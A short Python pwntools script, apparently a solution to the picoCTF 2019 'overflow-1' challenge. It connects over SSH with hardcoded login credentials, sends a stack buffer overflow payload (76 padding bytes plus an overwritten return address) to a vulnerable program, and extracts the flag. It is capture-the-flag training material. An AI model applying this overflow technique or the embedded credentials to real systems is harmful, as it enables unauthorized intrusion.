from pwn import *
import re
#python -c "import pwn;print('A'*76 + pwn.p32(0x080485e6))" | ./vuln
#/problems/overflow-1_2_305519bf80dcdebd46c8950854760999

try:
    session = ssh(host="2019shell1.picoctf.com",user="cse331",password="3curityishard", level=50)
    process = session.process(cwd='/problems/overflow-1_2_305519bf80dcdebd46c8950854760999', executable='./vuln')
    process.sendline('A'*76 + '\xe6\x85\x04\x08');
    recvl = process.recvall()
    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    process.close()
except:
    print('lost connection to server')
